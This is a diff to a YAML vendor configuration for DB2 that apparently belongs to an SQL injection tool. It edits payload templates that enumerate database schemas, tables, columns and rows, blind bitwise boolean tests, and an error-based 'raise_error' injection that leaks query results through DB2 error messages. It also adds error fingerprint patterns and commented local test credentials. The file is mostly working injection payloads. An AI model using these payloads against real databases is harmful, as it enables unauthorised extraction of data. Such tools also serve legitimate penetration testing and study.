@@ -1,4 +1,6 @@
 vendor: DB2
+# jdbc:db2://localhost:50000/testdb
+# db2inst1 test
 
 resource:
  info: |
@@ -14,7 +16,7 @@ resource:
  schema:
   database: |
    select varchar(
-       LISTAGG(
+       listagg(
            '${enclose_value_sql}'
            || trim(schemaname)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -26,7 +28,7 @@ resource:
 
   table: |
    select varchar(
-       LISTAGG(
+       listagg(
            '${enclose_value_sql}'
            || trim(name)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -39,7 +41,7 @@ resource:
 
   column: |
    select varchar(
-       LISTAGG(
+       listagg(
            '${enclose_value_sql}'
            || trim(name)
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -55,11 +57,11 @@ resource:
   row:
    query: |
     /**
-     * LISTAGG limit is 4000 and aggregate all data before limit is applied
+     * listagg limit is 4000 and aggregate all data before limit is applied
      * => subquery
      */
     select varchar(
-        LISTAGG(
+        listagg(
             '${enclose_value_sql}'
             || s
             || '${separator_qte_sql}1${enclose_value_sql}'
@@ -114,8 +116,10 @@ strategy:
   endingComment: --+-
   fingerprint:
    errorMessage:
+    # Spring
+    - 'DB2 SQL Error: SQLCODE=.*, SQLSTATE=.*, SQLERRMC=.*, DRIVER=.* [SQL State=.*, DB Errorcode=.*]' 
+    
     - function.db2
-    - DB2 SQL Error
     - 'Warning: db2_execute()'
     - 'Warning: db2_fetch_array()'
 
@@ -147,7 +151,7 @@ strategy:
     - 1 %21= 2
    initialization: 0%2b1 = 1
    bit: |
-    0 != BITAND(
+    0 != bitand(
         ascii(
             substr(
                 ${injection},
@@ -168,8 +172,9 @@ strategy:
    # RAISE_ERROR() interpreted whatever :OR :AND
    - name: RAISE_ERROR
      query: |
-      OR 1=(SELECT RAISE_ERROR('70001',(
+      /* DB2 SQL Error: SQLCODE=-438, SQLSTATE=70001, SQLERRMC=<sqli>, DRIVER=3.69.24 [SQL State=70001, DB Errorcode=-438] */
+      or 1=(select raise_error('70001',(
           ${window}
-      ))FROM SYSIBM.SYSDUMMY1)
+      )) from SYSIBM.SYSDUMMY1)
      # TODO Add to SQLEngine
      capacity: 70
